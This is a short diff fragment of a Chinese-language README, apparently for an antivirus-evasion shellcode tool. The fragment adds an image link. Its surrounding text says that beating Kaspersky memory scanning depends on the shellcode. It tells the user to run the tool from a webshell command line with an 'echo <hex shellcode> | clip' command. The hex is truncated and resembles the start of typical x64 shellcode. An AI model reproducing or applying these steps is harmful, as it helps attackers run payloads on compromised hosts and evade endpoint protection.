@@ -8,6 +8,9 @@
 
 卡巴斯基内存查杀主要看你shellcode能不能过了
 
+![image](https://user-images.githubusercontent.com/50757673/153533509-104ad517-73f6-47fe-9ad9-29cec7c9e626.png)
+
+
 用法：webshell命令行下执行
 ```
 echo fc4883e4f0e8c00000004... | clip
